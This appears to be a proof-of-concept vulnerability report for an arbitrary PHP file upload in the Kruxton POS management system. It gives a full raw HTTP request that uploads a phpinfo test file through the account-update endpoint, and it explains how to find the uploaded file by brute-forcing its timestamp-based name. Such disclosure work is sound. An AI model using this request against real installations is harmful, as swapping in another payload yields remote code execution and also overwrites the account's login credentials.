1. Download sourcecode from https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

2. Deploy the system

3. The php file upload point is http://172.31.171.96/kruxton/ajax.php?action=update_account

4. The http message is 

   ```
   POST /kruxton/ajax.php?action=update_account&XDEBUG_SESSION_START=11078 HTTP/1.1
   Host: 172.31.171.96
   Content-Length: 698
   Cache-Control: max-age=0
   Upgrade-Insecure-Requests: 1
   Origin: null
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary91u2mx53LUNjwQtX
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Accept-Encoding: gzip, deflate
   Accept-Language: zh-CN,zh;q=0.9
   Cookie: PHPSESSID=trdjs8jl8md348msi4p8aq5tu9
   Connection: close
   
   ------WebKitFormBoundary91u2mx53LUNjwQtX
   Content-Disposition: form-data; name="email"
   
   value
   ------WebKitFormBoundary91u2mx53LUNjwQtX
   Content-Disposition: form-data; name="firstname"
   
   value
   ------WebKitFormBoundary91u2mx53LUNjwQtX
   Content-Disposition: form-data; name="lastname"
   
   value
   ------WebKitFormBoundary91u2mx53LUNjwQtX
   Content-Disposition: form-data; name="password"
   
   value
   ------WebKitFormBoundary91u2mx53LUNjwQtX
   Content-Disposition: form-data; name="img"; filename="123.php"
   Content-Type: text/plain
   
   <?php phpinfo();?>
   ------WebKitFormBoundary91u2mx53LUNjwQtX
   Content-Disposition: form-data; name="submit"
   
   提交
   ------WebKitFormBoundary91u2mx53LUNjwQtX--
   
   ```

   ![image-20230311152452601](D:\网安学习\tryCVE\kruxton-1.assets\image-20230311152452601.png)

5. and then the system would create a php file in ./kruxton/assets/upload

   ![](https://github.com/paiqian/kruxton/blob/main/static/image-20230311151123673.png)

6. then access page http://172.31.171.96/kruxton/assets/uploads/1678518540_123.php

   ![image-20230311151402551](D:\网安学习\tryCVE\kruxton-1.assets\image-20230311151402551.png)

   The format of the file name is the timestamp plus the file name of the upload. The value of the timestamp is the timestamp corresponding to the time of the upload moment. You can bursting it in the approximate range.

> notice: the user's username and password change to the values passed at upload time
